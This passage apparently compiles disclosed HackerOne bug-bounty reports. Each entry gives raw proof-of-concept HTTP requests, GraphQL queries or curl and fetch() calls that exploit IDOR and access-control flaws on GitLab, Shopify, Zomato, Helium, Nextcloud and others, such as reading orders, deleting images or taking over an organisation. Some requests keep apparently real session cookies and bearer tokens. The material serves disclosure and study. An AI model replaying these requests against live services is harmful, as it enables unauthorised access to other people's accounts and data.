User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1620
Origin: https://gitlab.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) {\n  mlModel(id: $id) {\n    id\n    description\n    name\n    versionCount\n    candidateCount\n    latestVersion {\n      id\n      version\n      packageId\n      description\n      candidate {\n        id\n        name\n        iid\n        eid\n        status\n        params {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metadata {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metrics {\n          nodes {\n            id\n            name\n            value\n            step\n            __typename\n          }\n          __typename\n        }\n        ciJob {\n          id\n          webPath\n          name\n          pipeline {\n            id\n            mergeRequest {\n              id\n              iid\n              title\n              webUrl\n              __typename\n            }\n        
```

```
POST /api/graphql HTTP/2
Host: gitlab.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1714
Origin: https://gitlab.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

{"operationName":"getModelVersion","variables":{"modelId":"gid://gitlab/Ml::Model/1000401","modelVersionId":"gid://gitlab/Ml::ModelVersion/1000535"},"query":"query getModelVersion($modelId: MlModelID!, $modelVersionId: MlModelVersionID!) {\n  mlModel(id: $modelId) {\n    id\n    name\n    version(modelVersionId: $modelVersionId) {\n      id\n      version\n      packageId\n      description\n      candidate {\n        id\n        name\n        iid\n        eid\n        status\n        params {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metadata {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metrics {\n          nodes {\n            id\n            name\n            value\n            step\n            __typename\n          }\n          __typename\n        }\n        ciJob {\n          id\n          webPath\n          name\n          pipeline {\n            id\n            mergeRequest {\n              id\n              iid
```

```
POST /api/graphql HTTP/2
Host: gitlab.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 1620
Origin: https://gitlab.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) {\n  mlModel(id: $id) {\n    id\n    description\n    name\n    versionCount\n    candidateCount\n    latestVersion {\n      id\n      version\n      packageId\n      description\n      candidate {\n        id\n        name\n        iid\n        eid\n        status\n        params {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metadata {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metrics {\n          nodes {\n            id\n            name\n            value\
```

## #1892200 Attacker can create malicious child epics linked to a victim's epic in an unrelated group — gitlab — $1,160 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2023/1892200.md` (https://hackerone.com/reports/1892200)

```
<button aria-label="Add a to do" issuable-type="epic" issuable-id="gid://gitlab/Epic/29" type="button" class="btn hide-collapsed btn-default btn-sm gl-button" size="small"><!----> <!---->  <span class="gl-button-text">  Add a to do </span></button>
```

```
{"parent_id":30,"confidential":false,"title":"Attacker Child Epic"}
```

```
{"parent_id":29,"confidential":false,"title":"Attacker Child Epic"}
```

## #1489077 Bypass of fix #1370749 — shopify — $900 — Improper Access Control - Generic
Source: `hackerone/reports/2022/1489077.md` (https://hackerone.com/reports/1489077)

```
POST /admin/online-store/themes?hmac=████&host=c2hha3RpLWphbjIwMjIubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-IN&session=███&shop=shakti-jan2022.myshopify.com&timestamp=1645562098&_signed_params=host%2Clocale%2Csession%2Cshop%2Ctimestamp HTTP/1.1
Host: shakti-jan2022.myshopify.com
Connection: close
Content-Length: 581
Cache-Control: max-age=0
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: iframe
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: ████

appShellSessionToken=███████&appShellAttempts=1&appShellReason=
```

```
HTTP/1.1 200 OK
Date: Tue, 22 Feb 2022 20:35:06 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Sorting-Hat-PodId: 240
X-Sorting-Hat-ShopId: 62790336753
Vary: Accept-Encoding
X-XSS-Protection: 1; mode=block
X-Download-Options: noopen
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Referrer-Policy: origin-when-cross-origin
Content-Security-Policy: frame-ancestors https://shakti-jan2022.myshopify.com; default-src 'self' https://cdn.shopify.com https://cdn.shopifycdn.net; frame-src https://*; base-uri 'self'; object-src 'none'; img-src 'self' data: https://*; style-src 'self' 'unsafe-inline' https://cdn.shopify.com https://cdn.shopifycdn.net; font-src 'self' https://fonts.shopifycdn.com https://cdn.shopify.com https://cdn.shopifycdn.net; script-src 'self' https://cdn.shopify.com https://cdn.shopifycdn.net 'nonce-555f8cbe-fbc4-4125-9ae1-285b0bd06c9c'; connect-src 'self' online-store-web.shopifyapps.com https://notify.bugsnag.com https://burst.shopify.com wss://argus.shopifycloud.com https://shopify.s3.amazonaws.com monorail-edge.shopifysvc.com
X-Dc: gcp-asia-southeast1,us-east1
X-Request-ID: d9d0bda6-b4bd-489b-9c3c-7384cbba086a
X-Permitted-Cross-Domain-Policies: none
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 6e1affb60b3d8577-BOM
alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
Content-Length: 39792

```

## #1692788 Attacker is able to query Github repositories of arbitrary Shopify Hydrogen Users  — shopify — $900 — Improper Access Control - Generic
Source: `hackerone/reports/2023/1692788.md` (https://hackerone.com/reports/1692788)

```
POST /admin/internal/web/graphql/core?operation=GitHubRepositoriesQuery&type=query HTTP/2
Host: <ATTACKER_SHOPIFY_DOMAIN>
Cookie: <COOKIES_ATTACKER>
Content-Length: 778
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
X-Csrf-Token: <CSRF_TOKEN_ATTACKER>
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/json
Accept: application/json
X-Shopify-Web-Force-Proxy: 1
Sec-Ch-Ua-Platform: "macOS"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7

{
   "operationName":"GitHubRepositoriesQuery",
   "variables":{
      "ownerName":"<OWNER_NAME>",
      "ownerId":<OWNER_ID>,
      "searchQuery":"",
      "pageSize":15
   },
   "query":"query GitHubRepositoriesQuery($ownerName: String!, $ownerId: Int, $searchQuery: String, $pageSize: Int, $cursor: String) {\n  onlineStore {\n    versionControlGithub {\n      repositories(\n        ownerName: $ownerName\n        ownerId: $ownerId\n        first: $pageSize\n        searchQuery: $searchQuery\n        after: $cursor\n      ) {\n        totalCount\n        endCursor\n        hasNextPage\n        nodes {\n          id\n          name\n          description\n          writeAccess\n          defaultBranchName\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\
```

```
POST /admin/internal/web/graphql/core?operation=GitHubRepositoriesQuery&type=query HTTP/2
Host: <ATTACKER_SHOPIFY_DOMAIN>
Cookie: <COOKIES_ATTACKER>
Content-Length: 778
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
X-Csrf-Token: <CSRF_TOKEN_ATTACKER>
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/json
Accept: application/json
X-Shopify-Web-Force-Proxy: 1
Sec-Ch-Ua-Platform: "macOS"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7

{
```

```
      "ownerName":"<OWNER_NAME>",
      "ownerId":<OWNER_ID>,
      "searchQuery":"",
      "pageSize":15
```

## #1392032 Orders full read for a staff with only `Customers` permissions. — shopify — $800 — Improper Access Control - Generic
Source: `hackerone/reports/2022/1392032.md` (https://hackerone.com/reports/1392032)

```
POST /admin/internal/web/graphql/core HTTP/2
Host: scara31-store4.myshopify.com
Cookie: _secure_admin_session_id=████; _secure_admin_session_id_csrf=██████; _master_udr=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaWxtTldaaU5tWTFOQzFpT0RjMExUUTRZV010WVdWbVpTMWpORGMyTWpFek9HTXpPRE1HT2daRlJnPT0iLCJleHAiOiIyMDIzLTExLTA1VDAyOjA2OjA0LjIzNFoiLCJwdXIiOiJjb29raWUuX21hc3Rlcl91ZHIifX0%3D--da4b3109537545abe8f385374146855a201c8e06; new_admin=1; koa.sid=███████; koa.sid.sig=█████; identity-state=BAhbAA%3D%3D--db43e3715865ca03e3123219ec91e34189be9380; localization=; cart_currency=USD; secure_customer_sig=; _secure_session_id=32a319afefb4a8db65b18c31bcef06c9; _orig_referrer=; _landing_page=%2Fpassword; _y=43c1de8a-a87e-4df0-9359-c9d280c8870e; _s=9591d751-2bb8-4b5e-a679-5d2909ed1aee; _shopify_y=43c1de8a-a87e-4df0-9359-c9d280c8870e; _shopify_s=9591d751-2bb8-4b5e-a679-5d2909ed1aee; _ab=1; __ssid=43a93231-9d89-439b-aed1-824ac0b6e93d
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: Xs1twjjo-U9Q9RgMvDrLMuEPTa-Xeyj3TKCw
Origin: https://scara31-store4.myshopify.com
Content-Length: 156
Dnt: 1
Te: trailers

{
"query":"query MyQuery { node(id: \"gid://shopify/Customer/5639003504696\") { ... on HasEvents { events(first: 10) { edges { node { message } } } } } }"
}
```

```
"node":{
    "message":"Order Confirmation email for order \u003ca href=\"https:\/\/scara31-store4.myshopify.com\/admin\/orders\/4242972409912\"\u003e#1001\u003c\/a\u003e sent to this customer (aaa@aa.com)."
}
```

```
POST /admin/internal/web/graphql/core HTTP/2
Host: scara31-store4.myshopify.com
Cookie: _secure_admin_session_id=███; _secure_admin_session_id_csrf=███; _master_udr=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaWxtTldaaU5tWTFOQzFpT0RjMExUUTRZV010WVdWbVpTMWpORGMyTWpFek9HTXpPRE1HT2daRlJnPT0iLCJleHAiOiIyMDIzLTExLTA1VDAyOjA2OjA0LjIzNFoiLCJwdXIiOiJjb29raWUuX21hc3Rlcl91ZHIifX0%3D--da4b3109537545abe8f385374146855a201c8e06; new_admin=1; koa.sid=████████; koa.sid.sig=███; identity-state=BAhbAA%3D%3D--db43e3715865ca03e3123219ec91e34189be9380; localization=; cart_currency=USD; secure_customer_sig=; _secure_session_id=32a319afefb4a8db65b18c31bcef06c9; _orig_referrer=; _landing_page=%2Fpassword; _y=43c1de8a-a87e-4df0-9359-c9d280c8870e; _s=9591d751-2bb8-4b5e-a679-5d2909ed1aee; _shopify_y=43c1de8a-a87e-4df0-9359-c9d280c8870e; _shopify_s=9591d751-2bb8-4b5e-a679-5d2909ed1aee; _ab=1; __ssid=43a93231-9d89-439b-aed1-824ac0b6e93d
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: Xs1twjjo-U9Q9RgMvDrLMuEPTa-Xeyj3TKCw
Origin: https://scara31-store4.myshopify.com
Content-Length: 153
Dnt: 1
Te: trailers

{
"query":"query MyQuery { node(id: \"gid://shopify/Order/4287851397176\") { ... on Order { id, totalPrice } } }"
}
```

## #301137 GitHub import allows user to create child group under existing namespace — gitlab — $750 — Improper Access Control - Generic
Source: `hackerone/reports/2018/301137.md` (https://hackerone.com/reports/301137)

```
POST /import/github HTTP/1.1
Host: gitlab-instance
...

repo_id=115670444&target_namespace=jobertabma&new_name=test
```

## #853130 IDOR on stocky application-Low Stock-Varient-Settings-Columns — shopify — $750 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2020/853130.md` (https://hackerone.com/reports/853130)

```
POST /settings_for_low_stock_variants/111111 HTTP/1.1
Host: app.stockyhq.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.stockyhq.com/dashboard/low_stock
Content-Type: application/x-www-form-urlencoded
Content-Length: 968
Origin: https://app.stockyhq.com
Connection: close
Cookie: 
utf8=%E2%9C%93&_method=put&authenticity_token=HlhsW6AETAE9Mi7pLqJY%2FdE4jVWu53pNWFrVhkhLcoWuT%2FwBK6c2TDrvxWDZiRDRvwaw3DoXzZ7gAatGF4sRww%3D%3D&settings_for_low_stock_variant%5Bshow_grade%5D=0&settings_for_low_stock_variant%5Bshow_product_title%5D=0&settings_for_low_stock_variant%5Bshow_variant_title%5D=0&settings_for_low_stock_variant%5Bshow_sku%5D=0&settings_for_low_stock_variant%5Bshow_lost_per_day%5D=0&settings_for_low_stock_variant%5Bshow_reorder_point%5D=0&settings_for_low_stock_variant%5Bshow_lead_time%5D=0&settings_for_low_stock_variant%5Bshow_need%5D=0&settings_for_low_stock_variant%5Bshow_depletion_days%5D=0&settings_for_low_stock_variant%5Bshow_depletion_date%5D=0&settings_for_low_stock_variant%5Bshow_next_due_date%5D=0&settings_for_low_stock_variant%5Bshow_stock%5D=0&settings_for_low_stock_variant%5Bshow_on_po%5D=0&settings_for_low_stock_variant%5Bshow_on_order%5D=0&settings_for_low_stock_variant%5Bshow_shopify_products_only%5D=0&commit=Update

5) Replace the variants id with us
```

## #1117768 Guest Users can create issues for Sentry errors and track their status — gitlab — $610 — Improper Access Control - Generic
Source: `hackerone/reports/2021/1117768.md` (https://hackerone.com/reports/1117768)

```
     issue[title]=Title
     issue[description]= Description
     issue[sentry_issue_attributes][sentry_issue_identifier]=Error_Id
     authenticity_token= your_auth_token
     
```

```
     POST Data format for this is as follows: 
     '''
     issue[title]=Title
     issue[description]= Description
     issue[sentry_issue_attributes][sentry_issue_identifier]=Error_Id
     authenticity_token= your_auth_token
     '''
```

## #404797 IDOR to delete images from other stores — eternal — $600 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2018/404797.md` (https://hackerone.com/reports/404797)

```
GET /php/client_manage_handler?███&case=remove-active-photo HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
X-Requested-With: XMLHttpRequest
Cookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f3253db3be3d4c42a15b7b04d223a; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1535944804:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=cd186e1f53eee0d94e51ef00c9d4eb25; orange=2769113; al=1; session_id=null
Connection: close
X-Forwarded-For: 127.0.0.1
```

```
GET /php/client_manage_handler?███&case=remove-active-photo HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
X-Requested-With: XMLHttpRequest
Cookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f3253db3be3d4c42a15b7b04d223a; fbcity=283; zl=en; fbtrack=a09417c27b7e98b4b3f2ad8357ef3903; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1535944804:8035200; dpr=2; cto_lwid=82057293-9985-419b-a25b-4d8b6d89951b; G_ENABLED_IDPS=google; zhli=1; squeeze=cd186e1f53eee0d94e51ef00c9d4eb25; orange=2769113; al=1; session_id=null
Connection: close
X-Forwarded-For: 127.0.0.1

'''
```

## #1044869 Staff with no permissions could possibly list and accept billing promotions — shopify — $600 — Improper Access Control - Generic
Source: `hackerone/reports/2021/1044869.md` (https://hackerone.com/reports/1044869)

```
	fetch("https://{shop}.myshopify.com/admin/internal/web/graphql/core", {
	  "headers": {
		"accept": "application/json",
		"accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
		"content-type": "application/json",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"x-csrf-token": "{csrf-token}",
		"x-shopify-web-force-proxy": "1"
	  },
	  "referrerPolicy": "no-referrer",
	  "body": "{\"operationName\": \"Promotions\",\"query\": \"query Promotions {\\n shop {\\n  id\\n  applicablePromotions {\\n   id\\n   amount {\\n    amount\\n    currencyCode\\n    __typename\\n   }\\n   endAt\\n   description\\n   creditCategory\\n   promotionType\\n   __typename\\n  }\\n  __typename\\n }\\n}\"}",
	  "method": "POST",
	  "mode": "cors",
	  "credentials": "include"
	});
	
```

```
	{
	  "data": {
		"shop": {
		  "id": "gid:\\/\\/shopify\\/Shop\\/45677445142",
		  "applicablePromotions": [],
		  "__typename": "Shop"
		}
	  },
	  "extensions": {
		"cost": {
		  "requestedQueryCost": 2,
		  "actualQueryCost": 2,
		  "throttleStatus": {
			"maximumAvailable": 10000,
			"currentlyAvailable": 9998,
			"restoreRate": 500
		  }
		}
	  }
	}
	
```

```
	fetch("https://{shop}.myshopify.com/admin/internal/web/graphql/core", {
	  "headers": {
		"accept": "application/json",
		"accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
		"content-type": "application/json",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"x-csrf-token": "{csrf-token}",,
		"x-shopify-web-force-proxy": "1"
	  },
	  "referrerPolicy": "no-referrer",
	  "body": "{\"operationName\": \"applicablePromotionAccept\",\"variables\": { \"id\": \"gid://shopify/ApplicablePromotion/{promotion_id}\"},\"query\": \"mutation applicablePromotionAccept($id: ID!) {\\n applicablePromotionAccept(id: $id) {\\n  userErrors {\\n   field\\n   message\\n   __typename\\n  }\\n  __typename\\n }\\n}\"}",
	  "method": "POST",
	  "mode": "cors",
	  "credentials": "include"
	});
	
```

## #2208647 CVE-2023-42780: Apache Airflow: Improper access control vulnerability in the "List dag warnings" feature — ibb — $540 — Improper Access Control - Generic
Source: `hackerone/reports/2023/2208647.md` (https://hackerone.com/reports/2208647)

```
GET /api/v1/dagWarnings HTTP/1.1
Host: testvul.com:8080
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
content-type: application/json
Referer: http://testvul.com:8080/dags/example_external_task_marker_parent/grid
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=6ba0ebcd-94b6-41e9-8143-2ada52d554b1.IGPZy1m5c8235p5r8qo4GhPl_YM
Connection: close
Content-Length: 0
```

## #809816 Organization Takeover — helium — $500 — Improper Access Control - Generic
Source: `hackerone/reports/2020/809816.md` (https://hackerone.com/reports/809816)

```
POST /graphql HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 488
accept: */*
Sec-Fetch-Dest: empty
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxMTQ0LCJpYXQiOjE1ODMyNTQ3NDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIzNzQ4ZmJkYS1iMjhiLTRlOWYtOThiMy00ZTUzMGRlYWEwNmMiLCJuYmYiOjE1ODMyNTQ3NDMsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.-1VwG72225yPkZ0BimNSw_DFURRlT8Wh-AcAuDXgJFEEfiPduEdWcwwxY6-oQEHx8ILFUlxQYdbduYiTA-D79Q
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
content-type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS
```

```
HTTP/1.1 200 OK
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Content-Length: 514
Content-Type: application/json; charset=utf-8
Date: Tue, 03 Mar 2020 16:59:27 GMT
Server: Cowboy
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur

{"data":{"memberships":{"__typename":"PaginatedMemberships","entries":[{"__typename":"Membership","email":"████████","id":"512c8188-7008-49ce-a140-3538696e8c2c","inserted_at":"2020-03-03T16:09:37","role":"admin","two_factor_enabled":false},{"__typename":"Membership","email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","inserted_at":"2020-03-03T16:42:49","role":"manager","two_factor_enabled":false}],"pageNumber":1,"pageSize":10,"totalEntries":2,"totalPages":1}}}
```

```
PUT /api/memberships/bc96332e-c6b4-4728-b35e-8145eea0996a HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 31
accept: */*
Sec-Fetch-Dest: empty
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxNTA0LCJpYXQiOjE1ODMyNTUxMDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiJkODIxNzAwYS0xMGE5LTQwOGItYjc3ZC01OGY5ODY2ZWFkZmUiLCJuYmYiOjE1ODMyNTUxMDMsIm9yZ2FuaXphdGlvbiI6IjZjNmM4YzhhLTQ5ZmUtNGJlZi1hMDBjLWZkOTliZWUzOWIwZCIsIm9yZ2FuaXphdGlvbl9uYW1lIjoiaGFja2Vyb25lIiwic3ViIjoiNTU5NDZkMGUtMGE5MC00ZDRkLTlkYjgtMTIyMzYyZjU3NzU2IiwidHlwIjoiYWNjZXNzIn0.r13Aj4TXYzLYJ7clq9gl_SbpdSnVZpUsj0rFtgIMMeUXAE-44iiReL8bffEy4414L6Ess-dOH5L7MFiT55GAqw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
content-type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0
```

## #2541962 Disclose Hidden Comments on Media Section of hub.vroid.com — pixiv — $500 — Insecure Direct Object Reference (IDOR)
Source: `hackerone/reports/2026/2541962.md` (https://hackerone.com/reports/2541962)

```
POST /api/statuses/PASTE_ID_HERE/hearts HTTP/2
Host: hub.vroid.com
Cookie: ATTACKER_COOKIES
Sec-Ch-Ua: "Opera";v="109", "Not:A-Brand";v="8", "Chromium";v="123"
Accept: application/json, text/plain, */*
Content-Type: application/json
X-Api-Version: 11
Sec-Ch-Ua-Mobile: ?0
Content-Length: 2

{}
```

## #1724016 Download permissions can be changed by resharer — nextcloud — $500 — Improper Access Control - Generic
Source: `hackerone/reports/2023/1724016.md` (https://hackerone.com/reports/1724016)

```
curl -u user2:pass 'https://SERVER/ocs/v2.php/apps/files_sharing/api/v1/shares/11' -X PUT -H "OCS-APIREQUEST: true" -H 'Content-Type: application/json' --data-raw '{"permissions":"17","attributes":"[{\"scope\":\"permissions\",\"key\":\"download\",\"enabled\":true}]"}'
```

## #357485 Hacktivity of a private program visible to banned user if he gets invited to a program by hackbot — security — $500 — Improper Access Control - Generic
Source: `hackerone/reports/2018/357485.md` (https://hackerone.com/reports/357485)

```
GET /hacktivity?sort_type=latest_disclosable_activity_at&page=1&filter=type%3Aall%20to%3A██████████&range=forever HTTP/1.1
Host: hackerone.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
X-CSRF-Token: REDACTED
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
Content-Type: application/json
DNT: 1
Referer: https://hackerone.com/REDACTED/hacktivity
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: REDACTED
```

```
HTTP/1.1 200 OK
Date: Fri, 25 May 2018 14:30:37 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: private, no-cache, no-store, must-revalidate
Content-Disposition: inline; filename="response.json"
X-Request-Id: 17dafd21-a2e3-42c5-b046-e061da2a283c
Set-Cookie: REDACTED
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Expect-CT: enforce, max-age=86400
Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; child-src www.youtube-nocookie.com; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
